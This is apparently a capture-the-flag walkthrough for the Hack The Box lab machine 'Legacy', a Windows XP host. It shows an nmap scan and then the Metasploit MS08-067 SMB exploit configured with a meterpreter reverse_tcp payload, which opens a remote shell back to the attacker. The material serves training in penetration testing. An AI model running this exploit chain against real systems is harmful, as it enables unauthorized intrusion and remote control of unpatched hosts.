# Legacy

Legacy is a Windows XP machine that has a vulnerability in the microsoft-ds services

1. Let's scan for open port

   ```
   ┌──(schoon3r㉿nexer)-[~/Engagements/THM]
   └─$ nmap 10.10.10.4 -A -T4 -Pn
   Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-24 19:18 EST
   Nmap scan report for 10.10.10.4
   Host is up (0.031s latency).
   Not shown: 997 filtered tcp ports (no-response)
   PORT     STATE  SERVICE       VERSION
   139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
   445/tcp  open   microsoft-ds  Windows XP microsoft-ds
   3389/tcp closed ms-wbt-server
   Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

   Host script results:
   |_clock-skew: mean: 5d00h58m55s, deviation: 1h24m51s, median: 4d23h58m54s
   |_smb2-time: Protocol negotiation failed (SMB2)
   |_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:3a:7e (VMware)
   | smb-security-mode:
   |   account_used: <blank>
   |   authentication_level: user
   |   challenge_response: supported
   |_  message_signing: disabled (dangerous, but default)
   | smb-os-discovery:
   |   OS: Windows XP (Windows 2000 LAN Manager)
   |   OS CPE: cpe:/o:microsoft:windows_xp::-
   |   Computer name: legacy
   |   NetBIOS computer name: LEGACY\x00
   |   Workgroup: HTB\x00
   |_  System time: 2021-11-30T04:17:53+02:00

   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 51.38 second
   ```

2. Since port 3389 is closed, we will not bother for now. Let's bring up google and search string within the version of port 445 (google: windows xp microsoft-ds exploit)
3. First search result is from Rapid7 >> S08-067... let's read
4. Looks like its a metasploit exploit. Let's fire it up.
5. In msfconsole

   ```
   msf6 > search ms08_067

   msf6 > use 0

   msf6 exploit(windows/smb/ms08_067_netapi) > options

   Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    135              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


   Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.15.37    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


   Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


   msf6 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.10.10.4
   rhosts => 10.10.10.4

   msf6 exploit(windows/smb/ms08_067_netapi) > set lhost 10.10.14.6
   lhost => 10.10.14.6

   msf6 exploit(windows/smb/ms08_067_netapi) > set rport 445
   rport => 445

   msf6 exploit(windows/smb/ms08_067_netapi) > run
   ```

6. Important

   - you need to set the lhost to your tun0's IP address
   - also change the RPORT... for some reason the default rport is 135

7. Once you get a shell... you can then traverse the network. It's a windows machine so yeah!
8. Root.txt is available in c:\Documents and Settings\Administrator\Desktop

<br><br><br>

# Reference

1. https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/
